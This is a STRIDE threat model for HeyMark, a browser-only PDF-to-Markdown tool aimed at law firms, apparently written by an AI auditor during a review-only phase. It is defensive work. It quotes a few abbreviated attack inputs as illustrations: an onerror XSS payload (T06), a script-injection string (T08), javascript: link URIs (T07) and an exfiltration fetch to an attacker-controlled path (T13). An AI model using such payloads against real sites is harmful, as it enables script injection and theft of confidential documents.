# HeyMark Threat Model

**Date:** 2026-06-21
**Version:** 1.1.0
**Method:** STRIDE
**Auditor:** Claude Code — Phase 2 (no code changes)

---

## Scope and assumptions

HeyMark is a static, client-side-only web application. All PDF parsing, OCR,
and Markdown generation happen in the user's browser. No backend exists. No
document content is transmitted. The application is served by Cloudflare Pages
from the GitHub repository `github.com/oliverstills/heymark`.

**Business context:** HeyMark is sold into the legal sector. Its primary
differentiator is that source documents and extracted content never leave the
user's device. This claim is the product. Any control gap that undermines it
— or that appears to undermine it to a law firm's IT security team — is a
high-priority finding regardless of technical exploitability.

**STRIDE key:**
S = Spoofing · T = Tampering · R = Repudiation · I = Information Disclosure
· D = Denial of Service · E = Elevation of Privilege

---

## T01 — Malicious PDF exploiting pdf.js parser

| Field | Detail |
|---|---|
| STRIDE | E |
| Affected asset | Browser tab, OS process, in-session document data |
| Attack path | Attacker crafts a PDF with structures designed to exploit a parser bug in pdf.js (e.g., heap overflow, prototype pollution, memory corruption). User drops the file onto HeyMark. The exploit runs inside the pdf.js worker process. |
| Likelihood | LOW — pdf.js is maintained by Mozilla; known exploits are rare and patched quickly. Requires an unpatched 0-day or a stale vendored version. |
| Impact | HIGH — code execution in the browser worker context could allow exfiltration of in-session data or sandbox escape. |
| Current controls | pdf.js worker runs in a separate browser process (worker isolation). 50 MB size limit reduces surface. Magic-byte check prevents non-PDFs reaching the parser. |
| Missing controls | No pinned version with documented CVE monitoring. No process for vendor update review. |
| Residual risk | LOW — worker isolation bounds blast radius; no known exploits in current version. Risk rises if vendored pdf.js goes stale. |
| Verification | Confirm pdf.js version; subscribe to pdf.js security advisories. |
| Target phase | Phase 5 (SBOM + update policy) |

---

## T02 — Malformed or corrupt PDF causing parser hang or crash

| Field | Detail |
|---|---|
| STRIDE | D |
| Affected asset | Browser tab stability, user session |
| Attack path | A corrupt PDF (truncated file, invalid xref table, circular stream references) causes pdf.js to throw an unhandled exception or enter an infinite loop. Tab freezes or crashes. No data loss (nothing is persisted), but the user must reload. |
| Likelihood | MEDIUM — corrupt PDFs are common in the wild (email clients, print-to-PDF failures, partial downloads). Not necessarily adversarial. |
| Impact | LOW — tab crash; no data exposed; user reloads and tries again. |
| Current controls | `try/catch` in `convertFile()` catches pdf.js exceptions and marks the file `failed`. Page-level error messages displayed. |
| Missing controls | No timeout on `pdfjsLib.getDocument()` — a hang (not a throw) is not caught. `loadingTask.destroy()` is never called, so the worker may persist. Error messages expose raw pdf.js exception strings (F-08). |
| Residual risk | LOW — most malformed PDFs throw quickly. Infinite-loop hangs are theoretical without a confirmed case. |
| Verification | Test with synthetic malformed fixtures (Phase 3). |
| Target phase | Phase 3 (timeout, loadingTask.destroy, error message sanitization) |

---

## T03 — Excessive page count (denial of service)

| Field | Detail |
|---|---|
| STRIDE | D |
| Affected asset | Browser performance, user time |
| Attack path | A PDF declares thousands of pages. App iterates all pages, each requiring a `pdf.getPage()` + `getTextContent()` round-trip to the worker. Browser becomes unresponsive for the duration. |
| Likelihood | LOW — requires a deliberately crafted file or a legitimate edge case (e.g., court transcripts). |
| Impact | MEDIUM — browser unresponsive for minutes; user can cancel via the Cancel button. |
| Current controls | `MAX_PAGES = 2000` hard rejection after pdf.js loads the document. Status shown as `EXCEEDS 2000 PAGES`. |
| Missing controls | No soft warning at 500 pages (approved in Phase 2 questionnaire). No per-page progress timeout. |
| Residual risk | LOW — hard cap is in place. |
| Verification | Test with a synthetic 2001-page PDF. |
| Target phase | Phase 3 (add 500-page soft warning) |

---

## T04 — Oversized page dimensions causing canvas memory exhaustion

| Field | Detail |
|---|---|
| STRIDE | D |
| Affected asset | Browser tab memory, OS |
| Attack path | A PDF declares a page as e.g. 20,000 × 30,000 points (unusual but valid per PDF spec). The OCR path renders it at 3× scale: 60,000 × 90,000 pixels = ~21 GB of RGBA pixel data. The browser attempts the allocation, exhausting RAM and crashing the tab (or the entire browser on memory-constrained machines). `deskewCanvas` then creates additional off-screen canvases multiplying the problem. |
| Likelihood | LOW-MEDIUM — trivial to craft; only triggered when OCR mode is on. |
| Impact | HIGH — OOM crash; may affect other open browser tabs. |
| Current controls | NONE — no pixel-dimension check before canvas creation. |
| Missing controls | Compute `viewport.width × viewport.height` before render; cap scale to enforce a per-page pixel budget (e.g., 40 MP); enforce a cumulative pixel budget across all pages (F-02). |
| Residual risk | HIGH until Phase 3. |
| Verification | Test with a synthetic PDF with extreme page dimensions (Phase 3 fixture). |
| Target phase | Phase 3 (SECURITY_LIMITS.maxRenderedPixelsPerPage) |

---

## T05 — OCR resource exhaustion (per-page stall)

| Field | Detail |
|---|---|
| STRIDE | D |
| Affected asset | Browser CPU, user time, Tesseract worker |
| Attack path | A scanned page is crafted or happens to contain adversarial content (dense noise, adversarial patterns) that causes Tesseract's LSTM engine to take an extremely long time to converge. `worker.recognize(blob)` never resolves. The user must click Cancel manually to terminate the worker — there is no automatic timeout. |
| Likelihood | LOW — requires deliberate crafting or a pathologically difficult image. Real-world scans are unlikely to stall indefinitely. |
| Impact | MEDIUM — frozen UI on the OCR operation; no data loss; worker terminates on Cancel. |
| Current controls | User Cancel button (terminates worker via `rec.worker.terminate()`). Worker is always terminated in the `finally` block even on cancel. |
| Missing controls | No per-page timeout on `worker.recognize()`. No total-conversion timeout. (F-03) |
| Residual risk | MEDIUM — automatic protection absent; user-discoverable issue. |
| Verification | Manually test OCR on a pathological image; confirm Cancel terminates within 1 second (Phase 3). |
| Target phase | Phase 3 (race `worker.recognize()` against a 45-second timeout) |

---

## T06 — Document-derived HTML injection via preview

| Field | Detail |
|---|---|
| STRIDE | E |
| Affected asset | Browser DOM, session |
| Attack path | A crafted PDF contains text structured as HTML (e.g., `<img src=x onerror=fetch(...)>`). The text is extracted correctly as Markdown. When the user clicks the Preview tab, `marked.parse()` converts it to HTML and the result is assigned to `previewPanel.innerHTML`. DOMPurify sanitizes the output, but a DOMPurify bypass (known to exist in older versions) could allow script injection. Even with a successful injection, the strict CSP (`no 'unsafe-inline'`, `connect-src 'self'`) would block most exfiltration. |
| Likelihood | LOW — DOMPurify 3.2.4 is well-maintained; known bypasses are patched quickly. CSP provides defence-in-depth. |
| Impact | MEDIUM — a successful bypass + CSP bypass would allow in-session data access. CSP alone makes exfiltration very difficult. |
| Current controls | DOMPurify 3.2.4 with narrow allowlist. Strict CSP. |
| Missing controls | None needed — Preview tab is being **removed in Phase 3**. This threat is eliminated entirely. |
| Residual risk | ELIMINATED after Phase 3. |
| Verification | Confirm removal; verify previewPanel.innerHTML is no longer set with document-derived content. |
| Target phase | Phase 3 (remove Preview tab) |

---

## T07 — Malicious hyperlink in extracted Markdown

| Field | Detail |
|---|---|
| STRIDE | I, E |
| Affected asset | User navigating away; downstream tool receiving Markdown |
| Attack path | A PDF contains a hyperlink with a `javascript:` or `data:text/html` URI. The link appears in the extracted Markdown as `[text](javascript:...)`. In the raw text panel, it is rendered as plain text (harmless). If copy-pasted into a tool that auto-links, it could execute in that tool's context. |
| Likelihood | LOW — links appear as text, not clickable anchors; requires user action in a downstream tool. |
| Impact | LOW for HeyMark; MEDIUM for downstream tools that auto-link. |
| Current controls | Raw panel uses `textContent` (links are not rendered as clickable). Preview tab being removed eliminates the anchor-rendering path. |
| Missing controls | No URL scheme filtering in the extracted Markdown output itself. Downstream tools receive raw text including any malicious URLs. |
| Residual risk | LOW — harmless within HeyMark after Preview removal; downstream tool responsibility. |
| Verification | Confirm raw panel uses `textContent` (Phase 3 audit). Add URL sanitization to Markdown output in Phase 3. |
| Target phase | Phase 3 (strip `javascript:` / `data:text/html` URIs from output) |

---

## T08 — Integrity manifest tampering → verification UI injection

| Field | Detail |
|---|---|
| STRIDE | T, E |
| Affected asset | Integrity verification UI; user trust |
| Attack path | An attacker with Cloudflare Pages access replaces `release-hash.json` with a crafted version. The crafted `releaseUrl` field contains HTML (e.g., `"><script>...</script>`). When the user clicks VERIFY, `releaseEl.innerHTML` is set using an unsanitized template literal containing `manifest.releaseUrl` as link text (F-01). The injected script runs. CSP (`no 'unsafe-inline'`) blocks inline scripts, preventing execution. However, if an attacker can also loosen the CSP (by modifying `_headers`), the injection becomes exploitable. |
| Likelihood | VERY LOW — requires hosting compromise; attacker with that level of access could simply replace the entire app. |
| Impact | MEDIUM — if executed, runs in app origin with access to all DOM state; undermines the very feature meant to detect tampering. |
| Current controls | CSP blocks inline scripts. Same-origin fetch prevents external manifest injection. |
| Missing controls | `releaseEl.innerHTML` should use DOM API with explicit text escaping and URL scheme validation (F-01). |
| Residual risk | VERY LOW currently (CSP blocks execution); LOW after F-01 fix removes the injection path. |
| Verification | Automated: confirm no `innerHTML` assignment uses manifest values post-fix. |
| Target phase | Phase 3 (fix F-01: replace innerHTML template with DOM API) |

---

## T09 — Compromised vendored dependency (supply chain)

| Field | Detail |
|---|---|
| STRIDE | T, E |
| Affected asset | All document content processed by any user |
| Attack path | An upstream maintainer of pdf.js, Tesseract.js, DOMPurify, marked, or JSZip publishes a malicious update. Oliver updates the vendored file (manually or by mistake). The malicious code runs in users' browsers with full access to document content and the ability to `fetch()` to any same-origin endpoint (though CSP blocks cross-origin exfiltration). |
| Likelihood | LOW — targeted attacks on popular libraries have occurred (event-stream, xz-utils). pdf.js and Tesseract.js are high-profile targets. |
| Impact | CRITICAL — malicious library code could exfiltrate all document content via `fetch()` to a same-origin endpoint or use `blob:` URLs to export data. CSP would block cross-origin fetches but not same-origin ones. |
| Current controls | All libraries are vendored (no runtime CDN). Integrity manifest (SHA-256) detects unauthorized file changes after the fact. |
| Missing controls | No documented update review process. No SBOM. No upstream license files. No automated hash comparison before deployment. (F-06) |
| Residual risk | MEDIUM — vendoring prevents accidental runtime injection; human update process is the main gap. |
| Verification | Create and follow a documented update checklist (Phase 5). |
| Target phase | Phase 5 (SBOM, update policy, license files) |

---

## T10 — Compromised GitHub account

| Field | Detail |
|---|---|
| STRIDE | T |
| Affected asset | Source code; production deployment (via Cloudflare Pages auto-deploy) |
| Attack path | Attacker gains access to `github.com/oliverstills` (phishing, leaked token, session hijack). Pushes malicious code to `main`. Cloudflare Pages auto-deploys within minutes. All users receive the malicious version on next page load. |
| Likelihood | LOW — MFA is enabled on GitHub (confirmed). Requires MFA bypass or device compromise. |
| Impact | CRITICAL — full code replacement affects all users; malicious version can exfiltrate document content. |
| Current controls | MFA on GitHub (confirmed). |
| Missing controls | Branch protection (require PRs for main). Protected release tags. Personal access token audit. Deploy key audit. |
| Residual risk | LOW-MEDIUM — MFA materially reduces likelihood; auto-deploy means there is no human checkpoint between a push and production. |
| Verification | Enable branch protection rules on GitHub. Review active tokens and deploy keys (Phase 5). |
| Target phase | Phase 5 |

---

## T11 — Compromised Cloudflare Pages account

| Field | Detail |
|---|---|
| STRIDE | T |
| Affected asset | Production deployment |
| Attack path | Attacker gains access to the Cloudflare Pages dashboard. Modifies deployed files directly (via the Cloudflare UI or API) without going through GitHub. Users receive the modified version immediately. |
| Likelihood | LOW — depends on Cloudflare account security. MFA status unconfirmed. |
| Impact | CRITICAL — same as T10; direct file modification bypasses the GitHub audit trail. |
| Current controls | Unknown — MFA status on Cloudflare not confirmed. |
| Missing controls | Confirm and enforce MFA on Cloudflare account. Restrict who has Cloudflare project access. |
| Residual risk | UNKNOWN until MFA confirmed; treat as HIGH until verified. |
| Verification | Oliver confirms MFA enabled on Cloudflare. Screenshot of auth settings (Phase 5 checklist). |
| Target phase | Phase 5 |

---

## T12 — Compromised domain registrar (domain hijack)

| Field | Detail |
|---|---|
| STRIDE | S |
| Affected asset | Domain name; all user traffic |
| Attack path | Attacker hijacks the domain registrar account → changes DNS to point to an attacker-controlled server → serves a phishing version of HeyMark → users upload documents to the attacker. |
| Likelihood | VERY LOW — domain hijacks are rare but have happened to high-profile targets. |
| Impact | CRITICAL — complete privacy breach; no technical control on HeyMark's side can prevent it once DNS is changed. |
| Current controls | HSTS (`max-age=63072000; preload`) — returning users whose browser has cached the HSTS policy will refuse to load the site over HTTP, making a downgrade-to-HTTP attack ineffective. New users or users who haven't visited recently have no protection. |
| Missing controls | Registrar lock (transfer lock). MFA on registrar account. DNS change monitoring. |
| Residual risk | LOW-MEDIUM — HSTS helps returning users; new users have no protection from a DNS hijack. |
| Verification | Oliver confirms registrar lock and MFA (Phase 5 checklist). |
| Target phase | Phase 5 |

---

## T13 — Same-origin data exfiltration

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Document content in browser memory |
| Attack path | Malicious code running on the same origin (via a compromised vendor library — see T09 — or future XSS) calls `fetch('/attacker-controlled-path', { body: documentContent })` to send document data to a same-origin endpoint. Alternatively, abuses `blob:` or `data:` URLs to encode and exfiltrate data. |
| Likelihood | VERY LOW — requires code execution on the origin first (T09 or XSS). |
| Impact | CRITICAL if reached. |
| Current controls | `connect-src 'self' blob:` — blocks all third-party fetches. Same-origin means an attacker's receiver server would need to live on the same origin (impossible without hosting compromise). |
| Missing controls | None — CSP is the correct and sufficient control for this threat given the architecture. |
| Residual risk | VERY LOW — CSP eliminates the third-party exfiltration path; same-origin exfiltration requires full hosting compromise (T11). |
| Verification | Zero-egress browser test (Phase 4): intercept all requests during conversion and fail on any unexpected origin or document-content payload. |
| Target phase | Phase 4 |

---

## T14 — Third-party resource loading

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | User privacy (visit metadata, IP address would be exposed to third party) |
| Attack path | A future code change introduces an external URL (CDN script, tracking pixel, analytics beacon). Even if the URL receives no document content, it reveals that the user visited HeyMark, potentially at what time, and from what IP. |
| Likelihood | LOW — current code has zero external URLs; risk is from accidental future regression. |
| Impact | LOW — privacy metadata leak (not document content). |
| Current controls | `default-src 'none'` blocks all external resources. Referrer-Policy: `no-referrer` prevents URL leakage in any request. |
| Missing controls | Static analysis check for external URLs (Phase 4). |
| Residual risk | VERY LOW — CSP blocks the resource load before it occurs. |
| Verification | Static source check: grep for any http/https URL in application source that is not same-origin (Phase 4). |
| Target phase | Phase 4 |

---

## T15 — Browser extension access to document content

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Document content visible in DOM or clipboard |
| Attack path | A malicious or compromised browser extension holds `tabs` or `activeTab` permission and injects a content script. The content script reads `rawPanel.textContent` (which contains the extracted Markdown) or intercepts `navigator.clipboard.writeText()`. Extension code runs outside CSP scope and cannot be blocked by the application. |
| Likelihood | MEDIUM — many users have numerous browser extensions; extension supply chain compromises are increasingly common. |
| Impact | HIGH — full access to extracted document text without the user's knowledge. |
| Current controls | NONE — browser extensions with content script permissions bypass same-origin policy and CSP. This is a browser-architectural limitation. |
| Missing controls | None technically possible from the application layer. Must be documented as a known limitation. Recommend: use a dedicated browser profile or guest profile with no extensions for sensitive documents. |
| Residual risk | MEDIUM — inherent to browser architecture; no mitigation available from app code. |
| Verification | Document on public security page (Phase 6). |
| Target phase | Phase 6 (document known limitation) |

---

## T16 — Endpoint malware

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Document files before upload; Markdown files after download; OS clipboard |
| Attack path | Malware on the user's computer reads documents from disk before they are dropped onto HeyMark, or reads downloaded Markdown files from the downloads folder, or hooks the OS clipboard to capture copied text. |
| Likelihood | MEDIUM — endpoint compromise is the most common enterprise security incident. |
| Impact | CRITICAL — completely bypasses all browser-level controls. |
| Current controls | NONE — outside browser scope. |
| Missing controls | None technically possible from the application layer. Must be documented. |
| Residual risk | HIGH — inherent; no technical mitigation possible. This is a user/IT responsibility. |
| Verification | Document on public security page (Phase 6). |
| Target phase | Phase 6 (document known limitation) |

---

## T17 — Clipboard exposure after copy

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Extracted Markdown in OS clipboard |
| Attack path | User copies Markdown to clipboard. Another process, browser tab, or extension reads the clipboard before the user pastes it into the intended destination. |
| Likelihood | LOW — requires active clipboard snooping on the OS. |
| Impact | MEDIUM — extracted document text exposed. |
| Current controls | Clipboard write happens only on explicit user action (COPY button). No automatic clipboard operations. |
| Missing controls | None — OS clipboard management is outside application scope. |
| Residual risk | LOW — user-controlled action; OS-level risk, not HeyMark-specific. |
| Verification | Document on public security page (Phase 6). |
| Target phase | Phase 6 |

---

## T18 — Unsafe browser storage (localStorage preferences)

| Field | Detail |
|---|---|
| STRIDE | T, I |
| Affected asset | User preferences in localStorage (NOT document content) |
| Attack path | An XSS vulnerability or malicious extension reads or modifies HeyMark's localStorage keys. A modified value (e.g., forcing OCR mode on, changing language) could degrade user experience but cannot access document content, which is never stored. A read operation reveals only UI preferences — no document data. |
| Likelihood | VERY LOW — requires XSS (strong CSP makes this very difficult) or a malicious extension (T15). |
| Impact | LOW — preferences only; no document content stored; worst case is incorrect OCR settings on next load. |
| Current controls | Strong CSP (`no 'unsafe-inline'`) makes XSS-sourced localStorage writes very difficult. Document content is never written to localStorage. |
| Missing controls | Validate preference values on read (check that stored values are within expected ranges before applying). Use a namespace prefix to avoid collisions with extension storage. |
| Residual risk | VERY LOW. |
| Verification | Code review: confirm only non-sensitive preference keys are written; all values validated on read (Phase 3). |
| Target phase | Phase 3 (implement localStorage with validation) |

---

## T19 — Accidental user disclosure after export

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Downloaded Markdown files |
| Attack path | User downloads Markdown and then accidentally attaches the .md file to an email instead of the original PDF, or saves it to a shared network drive, or pastes it into a public document. |
| Likelihood | MEDIUM — this type of user error is common in professional settings. |
| Impact | MEDIUM-HIGH — depends entirely on document sensitivity. For a law firm, accidental disclosure of privileged content is a serious matter. |
| Current controls | `beforeunload` warning prevents accidental navigation away before downloading. Download uses browser-native save dialog. |
| Missing controls | Consider adding a one-time advisory on download: "This file contains extracted document text. Handle with the same care as the original." |
| Residual risk | MEDIUM — inherent to any export tool; user-controlled. |
| Verification | Document on public security page; add download advisory in Phase 3. |
| Target phase | Phase 3 (download warning), Phase 6 (security page) |

---

## T20 — Integrity manifest replacement undermines VERIFY

| Field | Detail |
|---|---|
| STRIDE | T |
| Affected asset | User trust in integrity verification |
| Attack path | Attacker with Cloudflare Pages access replaces both the app files and `release-hash.json` with hashes matching the modified files. The VERIFY button now reports "ALL MATCH" for a tampered application. |
| Likelihood | VERY LOW — requires full hosting compromise (T11). |
| Impact | HIGH — the verification feature is specifically what law firm IT teams and security reviewers would rely on. A tampered manifest that passes verification defeats the entire control. |
| Current controls | Manifest SHA-256 is published in GitHub release notes. Users who compare the manifest hash against the published value can detect the replacement. |
| Missing controls | The UX for verifying the manifest itself is buried (requires visiting the GitHub release page). The VERIFY panel does not prompt users to check the manifest hash. |
| Residual risk | LOW — two independent compromises (hosting + GitHub release notes, or hosting + user skipping hash check) are required for a silent attack. |
| Verification | Confirm VERIFY panel instructs users to compare manifest hash against the GitHub release (Phase 6 security page). |
| Target phase | Phase 6 |

---

## T21 — Malicious or privacy-invasive downstream tool

| Field | Detail |
|---|---|
| STRIDE | I |
| Affected asset | Extracted Markdown after it leaves HeyMark |
| Attack path | User copies or downloads Markdown and pastes it into an AI tool (ChatGPT, Harvey, Claude, etc.) that logs inputs, trains on them, or stores them in the cloud. The document content is now on a third party's servers. This is the intended user workflow — the risk is that users may not understand that HeyMark's privacy guarantee ends at export. |
| Likelihood | HIGH — this is the core use case. Every user who copies Markdown and pastes it into an AI tool has taken this path. |
| Impact | HIGH — depends entirely on which downstream tool is used and its data practices. |
| Current controls | UI states: "YOUR FILES NEVER LEAVE YOUR BROWSER." This applies to HeyMark only. |
| Missing controls | No advisory at copy/download time explaining that the privacy guarantee ends at export. Security page does not address downstream tool responsibility. |
| Residual risk | HIGH — inherent; user-controlled. Must be clearly communicated, especially to law firms where downstream tool data practices are a compliance matter. |
| Verification | Add copy/download advisory (Phase 3). Document explicitly on security page (Phase 6). |
| Target phase | Phase 3 (advisory), Phase 6 (security page) |
